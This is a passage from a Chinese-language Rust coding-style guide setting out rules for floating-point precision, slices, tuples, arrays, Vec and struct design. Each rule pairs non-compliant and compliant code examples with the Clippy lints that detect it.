println!(&quot;{}&quot;, v); //  0.123_456_789_9
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#excessive_precision">excessive_precision</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypflt02--从任何数字类型转换为浮点类型时注意避免损失精度"><a class="header" href="#gtypflt02--从任何数字类型转换为浮点类型时注意避免损失精度">G.TYP.FLT.02  从任何数字类型转换为浮点类型时注意避免损失精度</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>开发者了解发生精度损失的位置，会对解决因为转换而损失精度的问题更加有好处。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::cast_precision_loss)]

fn main(){
    // 不符合
    let x = u64::MAX;
    x as f64;
    // 不符合
    let x: f32 = 16_777_219.0 ; // 该数字转换为 f64 后会表示为 16_777_220.0
    x as f64;
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::cast_precision_loss)]

fn main(){
    // 符合
    let x = i32::MAX;
    let y = f64::from(x);  // 如果 x 为 u64 类型，则编译会出错，不接受这类转换
    // 符合
    let x: f32 = 16_777_219.0 ;
    let y = f64::from(x);  // 该数字转换为 f32 后会表示为 16_777_220.0
    println!(&quot;{y:?}&quot;)
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cast_precision_loss">cast_precision_loss</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypflt03-对精度高要求的场景下使用浮点数进行运算和比较时需要注意精度损失"><a class="header" href="#gtypflt03-对精度高要求的场景下使用浮点数进行运算和比较时需要注意精度损失">G.TYP.FLT.03 对精度高要求的场景下，使用浮点数进行运算和比较时需要注意精度损失</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>浮点数计算通常都是不精确的，直接对浮点数进行运算和比较可能造成数据错误。 如何更好地处理浮点数，可以参阅 <a href="https://floating-point-gui.de/">浮点数指南</a> 。</p>
<p>但是对精度要求不高的场合，比如机器学习中某些场景，对此不做要求。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::float_arithmetic, clippy::float_cmp, clippy::float_cmp_const)]

fn main(){
    let x = 1.2331f64;
    let y = 1.2332f64;

    payment(x, y);
}

fn payment(x: f64, y: f64) -&gt; f64{
    // 不符合： 浮点数计算有精度损失
    y - x
}

</code></pre></pre>
<p><strong>【正例】</strong></p>
<p>推荐使用精度更高的类型，比如 Decimal 类型（需要第三方库支持）。</p>
<pre><pre class="playground"><code class="language-rust">
#![warn(clippy::float_arithmetic, clippy::float_cmp, clippy::float_cmp_const)]

fn main(){
    let x = 1.2331f64;
    let y = 1.2332f64;

    payment(x, y);
}

fn payment(x: f64, y: f64) -&gt; Result&lt;f64, PaymentErr&gt;{
    let z = y - x;
    let error_margin = f64::EPSILON;
    // 符合：浮点数的差异绝对值在允许范围内
    if z.abs() &lt; error_margin {
        return Ok(z);
    } else {
        return PaymentErr(e);
    }
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#float_arithmetic">float_arithmetic</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#float_cmp">float_cmp</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#float_cmp_const">float_cmp_const</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#float_equality_without_abs">float_equality_without_abs</a></td><td>yes</td><td>no</td><td>suspicious</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypflt04--宜使用rust内置方法处理浮点数计算"><a class="header" href="#gtypflt04--宜使用rust内置方法处理浮点数计算">G.TYP.FLT.04  宜使用Rust内置方法处理浮点数计算</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>内置方法可能会牺牲一定性能，但可以提升准确性。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::imprecise_flops, clippy::suboptimal_flops)]

// 不符合
fn main() {
    let a = 3f32;
    let _ = a.powf(1.0 / 3.0);
    let _ = (1.0 + a).ln();
    let _ = a.exp() - 1.0;

    use std::f32::consts::E;

    let a = 3f32;
    let _ = (2f32).powf(a);
    let _ = E.powf(a);
    let _ = a.powf(1.0 / 2.0);
    let _ = a.log(2.0);
    let _ = a.log(10.0);
    let _ = a.log(E);
    let _ = a.powf(2.0);
    let _ = a * 2.0 + 4.0;
    let _ = if a &lt; 0.0 {
        -a
    } else {
        a
    };
    let _ = if a &lt; 0.0 {
        a
    } else {
        -a
    };
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::imprecise_flops, clippy::suboptimal_flops)]

// 符合
fn main(){
    let a = 3f32;
    let _ = a.cbrt();
    let _ = a.ln_1p();
    let _ = a.exp_m1();

    use std::f32::consts::E;

    let a = 3f32;
    let _ = a.exp2();
    let _ = a.exp();
    let _ = a.sqrt();
    let _ = a.log2();
    let _ = a.log10();
    let _ = a.ln();
    let _ = a.powi(2);
    let _ = a.mul_add(2.0, 4.0);
    let _ = a.abs();
    let _ = -a.abs();
}

</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#imprecise_flops">imprecise_flops</a></td><td>yes</td><td>no</td><td>nursery</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#suboptimal_flops">suboptimal_flops</a></td><td>yes</td><td>no</td><td>nursery</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypflt05-禁止在浮点数和整数相互转换时使用-transmute"><a class="header" href="#gtypflt05-禁止在浮点数和整数相互转换时使用-transmute">G.TYP.FLT.05 禁止在浮点数和整数相互转换时使用 <code>transmute</code></a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>使用 <code>transmute</code> 转换容易产生未定义行为，建议使用 <code>to_bites</code> 这样转换更加安全。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
unsafe {
    let _: u32 = std::mem::transmute(1f32);
    let _: f32 = std::mem::transmute(1_u32);
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>//符合
let _: u32 = 1f32.to_bits();
let _: f32 = f32::from_bits(1_u32);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#transmute_float_to_int">transmute_float_to_int</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#transmute_int_to_float">transmute_int_to_float</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="切片"><a class="header" href="#切片">切片</a></h1>
<p>切片（slice）允许开发者引用集合中连续的元素序列，类型签名用 <code>[T]</code>表示，但因为它是动态大小类型（DST），所以一般用 <code>&amp;[T]</code> 表示切片。</p>
<p><code>&amp;str</code> 就是一种字符串切片。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptypslc01--宜使用切片迭代器来代替手工索引"><a class="header" href="#ptypslc01--宜使用切片迭代器来代替手工索引">P.TYP.SLC.01  宜使用切片迭代器来代替手工索引</a></h2>
<p><strong>【描述】</strong></p>
<p>在 for 循环中使用索引是比较常见的编程习惯，但是这种方式是最有可能导致边界错误的。</p>
<p>利用 切片自带的方法，并利用迭代器，可以避免这种错误。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let points: Vec&lt;Coordinate&gt; = ...;
let differences = Vec::new();

// 不符合：人工计算长度选择范围很可能会出错
for i in 1..points.len() [
  let current = points[i];
  let previous = points[i-1];
  differences.push(current - previous);
]
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let points: Vec&lt;Coordinate&gt; = ...;
let mut differences = Vec::new();

// 符合：切片提供 windows 或 array_windows 方法返回迭代器
for [previous, current] in points.array_windows().copied() {
    differences.push(current - previous);
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptypslc02-宜使用切片模式来提升代码的可读性"><a class="header" href="#ptypslc02-宜使用切片模式来提升代码的可读性">P.TYP.SLC.02 宜使用切片模式来提升代码的可读性</a></h2>
<p><strong>【描述】</strong></p>
<p>切片也支持模式匹配，适当应用切片模式，可以有效提升代码可读性。</p>
<p><strong>【正例】</strong></p>
<p>利用切片模式编写判断回文字符串（如&quot;aba&quot;、&quot;abba&quot;之类）的函数。代码来自于：<a href="https://adventures.michaelfbryan.com/posts/daily/slice-patterns/#matching-the-start-of-a-slice">Daily Rust: Slice Patterns</a>，还有更多用例。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn word_is_palindrome(word: &amp;str) -&gt; bool {
    let letters: Vec&lt;_&gt; = word.chars().collect();

    is_palindrome(&amp;letters)
}
// 符合：利用切片模式匹配来判断是否回文字符串
fn is_palindrome(items: &amp;[char]) -&gt; bool {
    match items {
        [first, middle @ .., last] =&gt; first == last &amp;&amp; is_palindrome(middle),
        [] | [_] =&gt; true,
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="元组"><a class="header" href="#元组">元组</a></h1>
<p>元组是异构复合类型，可以存储多个不同类型的元素。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtyptup01--使用元组时其元素不宜超过3个"><a class="header" href="#gtyptup01--使用元组时其元素不宜超过3个">G.TYP.TUP.01  使用元组时，其元素不宜超过3个</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>元组是异构复合类型，元素过多，其表达力会下降，影响代码可读性和可维护性。</p>
<p>尤其是利用元组作为函数返回值时，不宜过多。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 不符合：超过3个元组参数
fn convert(x: i8) -&gt; (i8, i16, i32, i64, f32, f64) {
    (x as i8, x as i16, x as i32, 
     x as i64, x as f32, x as f64)
}

fn main(){
    let _ = convert(3);
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="数组"><a class="header" href="#数组">数组</a></h1>
<p>这里指固定长度数组。注意，不同长度的数组，被视为不同的类型。比如 <code>[T;1]</code>和 <code>[T;3]</code> 是两种不同的类型。</p>
<p>从 Rust 1.51 版本开始，稳定了常量泛型（const generics）功能，形如 <code>[T;1]</code>和 <code>[T;3]</code> 这种不同的类型可以统一为 <code>[T; N]</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtyparr01-创建大全局数组时宜使用静态变量而非常量"><a class="header" href="#gtyparr01-创建大全局数组时宜使用静态变量而非常量">G.TYP.ARR.01 创建大全局数组时宜使用静态变量而非常量</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>因为常量会内联，对于大的数组，通常情况下，会使用其引用，使用静态变量定义更好。</p>
<p>栈上的数组大小以不超过 512KiB 为宜。</p>
<blockquote>
<p>虽然常量本质上是会内联，但 Rust 支持复制消除（Copy Elision）优化（非强制），而且在不断改进完善中，对于这种大的数据应该会有相关优化。</p>
</blockquote>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::large_stack_arrays)]

<span class="boring">fn main() {
</span>// 不符合
pub const A: [u32;1_000_000] = [0u32; 1_000_000];
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::large_stack_arrays)]

<span class="boring">fn main() {
</span>// 符合
pub static A: [u32;1_000_000] = [0u32; 1_000_000];
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#large_const_arrays">large_const_arrays</a></td><td>yes</td><td>no</td><td>perf</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#large_stack_arrays">large_stack_arrays</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<p>注意： <code>large_stack_arrays</code> 会检查在栈上分配的大数组，但clippy默认是 allow，根据实际使用场景决定是否针对这种情况发出警告。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtyparr02--使用数组索引时禁止越界访问"><a class="header" href="#gtyparr02--使用数组索引时禁止越界访问">G.TYP.ARR.02  使用数组索引时禁止越界访问</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>越界访问在运行时会 Panic！</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
let x = [1, 2, 3, 4];
x[9];
&amp;x[2..9];
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let x = [1, 2, 3, 4];
x[0];
x[3];
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#out_of_bounds_indexing">out_of_bounds_indexing</a></td><td>yes</td><td>no</td><td><strong>correctness</strong></td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtyparr03--当数组元素为原生数据类型primitive排序时优先选用非稳定排序"><a class="header" href="#gtyparr03--当数组元素为原生数据类型primitive排序时优先选用非稳定排序">G.TYP.ARR.03  当数组元素为原生数据类型（Primitive），排序时优先选用非稳定排序</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>稳定排序会消耗更多的内存和 CPU 周期，相对而言，非稳定排序性能更佳。</p>
<p>当然，在必须要稳定排序的场合，不应该使用非稳定排序。</p>
<p>注： <code>Vec&lt;T&gt;</code> 动态数组也适用此规则</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
let mut vec = vec![2, 1, 3];
vec.sort();  // stable sort
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let mut vec = vec![2, 1, 3];
vec.sort_unstable(); // unstable sort
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// https://docs.rs/crate/solana-runtime/1.7.11/source/src/accounts_db.rs#:~:text=clippy%3a%3astable_sort_primitive
 pub fn generate_index(&amp;self, limit_load_slot_count_from_snapshot: Option&lt;usize&gt;) {
        let mut slots = self.storage.all_slots();
        #[allow(clippy::stable_sort_primitive)]
        slots.sort(); // 商业需求这里需要稳定排序
        // ...
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#stable_sort_primitive">stable_sort_primitive</a></td><td>yes</td><td>no</td><td><strong>perf</strong></td><td>warn</td></tr>
</tbody></table>
<p>当确实需要稳定排序时，需要修改该 lint 的设置为 <code>allow</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="动态数组"><a class="header" href="#动态数组">动态数组</a></h1>
<p>这里指可以动态增长的数组<code>Vec&lt;T&gt;</code>。</p>
<p>在数组一节中有<a href="safe-guides/coding_practice/data-type/./array.html">部分原则和规则</a>也适用于这里。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptypvec01-非必要时不宜使用动态数组"><a class="header" href="#ptypvec01-非必要时不宜使用动态数组">P.TYP.VEC.01 非必要时不宜使用动态数组</a></h2>
<p><strong>【描述】</strong></p>
<p>非必须不宜使用 <code>Vec&lt;T&gt;</code>，应该优先尝试使用固定长度数组或常量泛型。</p>
<p>或者可以参考第三方库，诸如 <a href="https://docs.rs/smallvec/latest/smallvec"><code>smallvec</code></a> ，在元素比较少量的时候，可以放到栈上进行管理，如果超过一定元素才会选择堆内存。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 不符合
    let v: Vec&lt;i32&gt; = vec![1, 2, 3];
    println!(&quot;{:#}&quot;, v);
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 符合
    let v = [1, 2, 3];
    println!(&quot;{:#?}&quot;, v);
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptypvec02-创建动态数组时宜预先分配足够容量避免后续操作中产生多次分配"><a class="header" href="#ptypvec02-创建动态数组时宜预先分配足够容量避免后续操作中产生多次分配">P.TYP.VEC.02 创建动态数组时，宜预先分配足够容量，避免后续操作中产生多次分配</a></h2>
<p><strong>【描述】</strong></p>
<p>预分配足够的容量，避免后续内存分配，可以提升代码性能。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
let mut output = Vec::new();
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let mut output = Vec::with_capacity(input.len());
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypvec01--禁止访问未初始化的数组"><a class="header" href="#gtypvec01--禁止访问未初始化的数组">G.TYP.VEC.01  禁止访问未初始化的数组</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>访问未初始化数组的内存会导致未定义行为。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut vec: Vec&lt;u8&gt; = Vec::with_capacity(1000);
unsafe { vec.set_len(1000); }
// 不符合
reader.read(&amp;mut vec); // error: Undefined Behavior: using uninitialized data, but this operation requires initialized memory
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let mut vec: Vec&lt;u8&gt; = vec![0; 1000];
reader.read(&amp;mut vec);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#uninit_vec">uninit_vec</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="结构体"><a class="header" href="#结构体">结构体</a></h1>
<p>Rust 包含了三种结构体： 命名结构体、元组结构体、单元结构体。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptypsct01-为结构体实现构造性方法时避免构造后再初始化的情况"><a class="header" href="#ptypsct01-为结构体实现构造性方法时避免构造后再初始化的情况">P.TYP.SCT.01 为结构体实现构造性方法时，避免构造后再初始化的情况</a></h2>
<p><strong>【描述】</strong></p>
<p>跟其他OOP 或 FP 语言不一样， Rust 的惯用方式是构建即初始化。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
// 先构建
let mut dict = Dictionary::new();
// 后初始化
dict.load_from_file(&quot;./words.txt&quot;)?;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
// 构建即初始化
let dict = Dictionary::from_file(&quot;./words.txt&quot;)?;

impl Dictionary {
  fn from_file(filename: impl AsRef&lt;Path&gt;) -&gt; Result&lt;Self, Error&gt; {
    let text = std::fs::read_to_string(filename)?;
    // 不会去存储空状态
    let mut words = Vec::new();
    for line in text.lines() {
      words.push(line);
    }
    Ok(Dictionary { words })
  }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptypsct02--结构体实例需要默认实现时宜使用default特质"><a class="header" href="#ptypsct02--结构体实例需要默认实现时宜使用default特质">P.TYP.SCT.02  结构体实例需要默认实现时，宜使用<code>Default</code>特质</a></h2>
<p><strong>【描述】</strong></p>
<p>为结构体实现 <code>Default</code> 对于简化代码提高可读性很有帮助。</p>
<p><strong>【示例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use std::{path::PathBuf, time::Duration};

#[derive(Default, Debug, PartialEq)]
struct MyConfiguration {
    output: Option&lt;PathBuf&gt;,
    search_path: Vec&lt;PathBuf&gt;,
    timeout: Duration,
    check: bool,
}

fn main() {
    // 使用 default 方法创建实例
    let mut conf = MyConfiguration::default();
    conf.check = true;
    println!(&quot;conf = {:#?}&quot;, conf);
        
    // 创建新实例的时候，使用局部更新更加方便
    let conf1 = MyConfiguration {
        check: true,
        ..Default::default()
    };
    assert_eq!(conf, conf1);
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypsct01-对外导出的公开的-struct宜添加non_exhaustive属性"><a class="header" href="#gtypsct01-对外导出的公开的-struct宜添加non_exhaustive属性">G.TYP.SCT.01 对外导出的公开的 Struct，宜添加<code>#[non_exhaustive]</code>属性</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>作为对外公开的 结构体，为了保持稳定性，应该使用 <code>#[non_exhaustive]</code>属性，避免因为将来结构体字段发生变化而影响到下游的使用。主要涉及命名结构体和元组结构体。</p>
<p><strong>【反例】</strong></p>
<p>在 <code>#[non_exhaustive]</code> 属性稳定之前，社区内还有一种约定俗成的写法来达到防止下游自定义枚举方法。通过 <code>manual_non_exhaustive</code> 可以监控这类写法。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::exhaustive_structs)]

<span class="boring">fn main() {
</span>struct S {
    pub a: i32,
    pub b: i32,
    _priv: (),  // 不符合：这里用 下划线作为前缀定义的字段，作为私有字段，不对外公开
}

// 用户无法自定义实现该结构体的方法。
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::exhaustive_structs)]

<span class="boring">fn main() {
</span>// 符合
#[non_exhaustive]
struct Foo {
    bar: u8,
    baz: String,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>也有例外情况！</p>
<p>从语义角度看，<code>#[non_exhaustive]</code> 只是代表未穷尽的字段或枚举变体，是为了表达“未来可能有变化”这种语义。</p>
<p>但是当要表达 “这个结构体不允许对方实例化” 的语义时，通过自定义的 <code>_priv</code>字段就可以更好地表达这个语义。</p>
<p>而使用 <code>#[non_exhaustive]</code> 虽然也能达到 “不允许对方实例化的目的”，但是在代码可读性层面，却无法表达出这个语义。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From: https://github.com/tokio-rs/tokio/blob/master/tokio-util/src/codec/framed.rs

#[allow(clippy::manual_non_exhaustive)]
pub struct FramedParts&lt;T, U&gt; {
    pub io: T,
    pub codec: U,
    pub read_buf: BytesMut,
    pub write_buf: BytesMut,
    
    /// This private field allows us to add additional fields in the future in a
    /// backwards compatible way.
    _priv: (),
}

impl&lt;T, U&gt; FramedParts&lt;T, U&gt; {
    /// Create a new, default, `FramedParts`
    pub fn new&lt;I&gt;(io: T, codec: U) -&gt; FramedParts&lt;T, U&gt;
    where
        U: Encoder&lt;I&gt;,
    {
        FramedParts {
            io,
            codec,
            read_buf: BytesMut::new(),
            write_buf: BytesMut::new(),
            _priv: (),
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#exhaustive_structs">exhaustive_structs</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#manual_non_exhaustive">manual_non_exhaustive</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypsct02--当结构体中有超过三个布尔类型的字段宜将其独立为新的枚举类"><a class="header" href="#gtypsct02--当结构体中有超过三个布尔类型的字段宜将其独立为新的枚举类">G.TYP.SCT.02  当结构体中有超过三个布尔类型的字段，宜将其独立为新的枚举类</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>这样有助于提升 代码可读性和 API 。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::struct_excessive_bools)]

<span class="boring">fn main() {
</span>// 不符合
struct S {
    name: String,
    is_pending: bool,
    is_processing: bool,
    is_finished: bool,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::struct_excessive_bools)]
<span class="boring">fn main() {
</span>// 符合
struct S {
    name: String,
    state: State,
}

enum State {
    Pending,
    Processing,
    Finished,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#struct_excessive_bools">struct_excessive_bools</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<p>该 lint 对应 <code>clippy.toml</code> 配置项：</p>
<pre><code class="language-toml"># 用于配置函数可以拥有的 bool 类型参数最大数量，默认为 3。
max-struct-bools=3 
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypsct03-宜使用结构体功能更新语法来提升代码可读性"><a class="header" href="#gtypsct03-宜使用结构体功能更新语法来提升代码可读性">G.TYP.SCT.03 宜使用结构体功能更新语法来提升代码可读性</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>更改结构体最好提供结构体方法进行更改，而不是直接构建结构体内容。</p>
<p>但是需要多次修改结构体内容的时候，宜使用结构体更新语法来提升代码可读性。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
impl&lt;'a&gt; Colorize for &amp;'a str {
    fn red(self) -&gt; ColoredString {
        ColoredString {
            fgcolor: String::from(&quot;31&quot;),
            input: String::from(self), // 该方法只更新 fgcolor 和 input
            bgcolor: String::default(); // 如果该结构体字段比较多的话，此处就需要指派很多字段，不太方便
        }   
    }
